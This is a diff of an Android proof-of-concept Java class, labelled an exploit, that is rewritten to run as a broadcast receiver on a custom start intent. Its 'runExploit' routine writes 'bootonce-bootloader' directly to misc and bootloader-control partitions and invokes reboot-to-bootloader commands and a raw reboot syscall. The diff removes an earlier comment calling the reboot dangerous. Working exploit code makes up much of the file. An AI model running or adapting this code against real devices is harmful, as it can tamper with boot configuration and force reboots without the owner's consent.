@@ -1,13 +1,13 @@
-// Main.java - Pure Java BCB Verification using android.system.Os
 package com.poc;
 
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
 import android.os.Process;
-import android.os.IRecoverySystem;
-import android.os.ServiceManager;
+import android.os.IBinder;
 import android.system.Os;
 import android.system.OsConstants;
 import android.system.ErrnoException;
-import android.os.IBinder;
 
 import java.io.BufferedWriter;
 import java.io.File;
@@ -19,11 +19,19 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 
-public class Receiver {
+public class Receiver extends BroadcastReceiver {
 
     private static final String REPORT_PATH = "/cache/exploit_report.txt";
 
-    public static void main(String[] args) {
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (!"com.poc.ACTION_START".equals(intent.getAction())) {
+            return;
+        }
+        runExploit();
+    }
+
+    private void runExploit() {
         StringBuilder report = new StringBuilder();
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());
 
@@ -102,10 +110,8 @@ public class Receiver {
             for (String path : miscPaths) {
                 FileDescriptor fd = null;
                 try {
-                    // Open with O_RDWR | O_SYNC
                     fd = Os.open(path, OsConstants.O_RDWR | OsConstants.O_SYNC, 0644);
                     byte[] data = "bootonce-bootloader".getBytes();
-                    // Write to beginning of partition
                     Os.lseek(fd, 0, OsConstants.SEEK_SET);
                     Os.write(fd, data, 0, data.length);
                     Os.fsync(fd);
@@ -145,10 +151,10 @@ public class Receiver {
                 }
             }
 
-            // 7c. Execute /system/bin/reboot bootloader
+            // 7c. Execute /system/bin/reboot bootloader (java.lang.Process)
             report.append("Execute /system/bin/reboot bootloader: ");
             try {
-                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/reboot", "bootloader"});
+                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/reboot", "bootloader"});
                 int code = p.waitFor();
                 report.append(code == 0 ? "SUCCESS (reboot initiated)\n" : "FAILED (exit=" + code + ")\n");
             } catch (Exception e) {
@@ -181,18 +187,24 @@ public class Receiver {
                 report.append("FAILED (service null)\n");
             }
 
-            // 7f. Os.reboot (reboot syscall)
-            report.append("Os.reboot(LINUX_REBOOT_CMD_RESTART): ");
+            // 7f. Os.reboot (reboot syscall) - use raw constant
+            report.append("Os.reboot(LINUX_REBOOT_CMD_RESTART=0x1234567): ");
             try {
-                // LINUX_REBOOT_MAGIC1 = 0xfee1dead, MAGIC2 = 0x28121969
-                // Os.reboot(cmd) uses the standard reboot syscall with fixed magic numbers.
-                // We try LINUX_REBOOT_CMD_RESTART (0x1234567) - this is dangerous!
-                // Instead, we try to read if we have permission.
-                // Os.reboot(0x1234567) will restart the device. We'll just test if it throws.
-                Os.reboot(OsConstants.LINUX_REBOOT_CMD_RESTART);
+                // LINUX_REBOOT_MAGIC1=0xfee1dead, MAGIC2=0x28121969 are fixed in Os.reboot
+                // We only pass the command: LINUX_REBOOT_CMD_RESTART = 0x1234567
+                // Use OsConstants.LINUX_REBOOT_CMD_RESTART if available, else use 0x1234567
+                int restartCmd;
+                try {
+                    // Try to get from OsConstants if available
+                    restartCmd = OsConstants.LINUX_REBOOT_CMD_RESTART;
+                } catch (Throwable t) {
+                    // Fallback to raw constant
+                    restartCmd = 0x1234567;
+                }
+                Os.reboot(restartCmd);
                 report.append("SUCCESS (device rebooting!)\n");
             } catch (ErrnoException e) {
-                report.append("ErrnoException (errno=").append(e.errno).append(") - Permission denied likely\n");
+                report.append("ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
             } catch (Exception e) {
                 report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
             }
@@ -223,7 +235,7 @@ public class Receiver {
 
     // --- Utilities ---
 
-    private static void saveReport(String content) throws IOException {
+    private void saveReport(String content) throws IOException {
         File reportFile = new File(REPORT_PATH);
         if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
         try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) {
@@ -234,7 +246,7 @@ public class Receiver {
         } catch (Exception ignored) {}
     }
 
-    private static String readFile(String path) {
+    private String readFile(String path) {
         try {
             return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path))).trim();
         } catch (Exception e) {
@@ -242,7 +254,7 @@ public class Receiver {
         }
     }
 
-    private static String getProp(String key) {
+    private String getProp(String key) {
         try {
             return (String) Class.forName("android.os.SystemProperties")
                     .getMethod("get", String.class, String.class)
@@ -252,8 +264,7 @@ public class Receiver {
         }
     }
 
-    // Write test using android.system.Os (system libc via JNI)
-    private static String writeTestOs(String path) {
+    private String writeTestOs(String path) {
         FileDescriptor fd = null;
         try {
             fd = Os.open(path, OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
@@ -261,7 +272,6 @@ public class Receiver {
             Os.fsync(fd);
             Os.close(fd);
             fd = null;
-            // Try to delete
             new File(path).delete();
             return "SUCCESS (write/delete)";
         } catch (ErrnoException e) {
@@ -275,7 +285,7 @@ public class Receiver {
         }
     }
 
-    private static String canExecute(String path) {
+    private String canExecute(String path) {
         File f = new File(path);
         if (f.exists()) {
             return f.canExecute() ? "EXECUTABLE" : "NOT EXECUTABLE";
@@ -288,8 +298,7 @@ public class Receiver {
         }
     }
 
-    // Reflection for ServiceManager
-    private static Object getService(String name) {
+    private Object getService(String name) {
         try {
             Class<?> sm = Class.forName("android.os.ServiceManager");
             Method getService = sm.getMethod("getService", String.class);
@@ -310,7 +319,7 @@ public class Receiver {
         }
     }
 
-    private static Object getPackageManagerService() {
+    private Object getPackageManagerService() {
         return getService("package");
     }
 }
